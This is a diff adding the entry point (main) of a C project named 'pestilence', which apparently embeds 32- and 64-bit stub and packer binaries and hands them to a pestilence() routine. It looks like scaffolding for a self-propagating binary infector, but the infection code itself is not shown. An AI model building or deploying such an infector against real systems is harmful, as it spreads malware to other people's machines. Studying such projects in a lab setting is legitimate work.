@@ -1,0 +1,45 @@
+#include <stdlib.h>
+#include <bits/getopt_core.h>
+#include "utils.h"
+#include "pestilence.h"
+
+extern char _binary_resources_stub64_bin_start[];
+extern char _binary_resources_stub64_bin_end[];
+extern char _binary_resources_stub32_bin_start[];
+extern char _binary_resources_stub32_bin_end[];
+extern char _binary_resources_packer64_bin_start[];
+extern char _binary_resources_packer64_bin_end[];
+extern char _binary_resources_packer32_bin_start[];
+extern char _binary_resources_packer32_bin_end[];
+
+int	main(int argc, char **argv, char **envp) {
+	UNUSED(envp);
+	int			opt;
+
+	set_pn(*argv);
+	opterr = 0;
+	while ((opt = getopt(argc, argv, "v")) != -1) {
+		switch (opt) {
+			case 'v':
+#ifdef DEBUG
+				set_verbose(true);
+#endif
+				break ;
+		break;
+			default:
+				break ;
+		}
+	}
+	argc -= optind;
+	argv += optind;
+	pestilence(
+		_binary_resources_stub32_bin_start,
+		_binary_resources_stub32_bin_end,
+		_binary_resources_stub64_bin_start,
+		_binary_resources_stub64_bin_end,
+		_binary_resources_packer32_bin_start,
+		_binary_resources_packer32_bin_end,
+		_binary_resources_packer64_bin_start,
+		_binary_resources_packer64_bin_end);
+	return (EXIT_SUCCESS);
+}
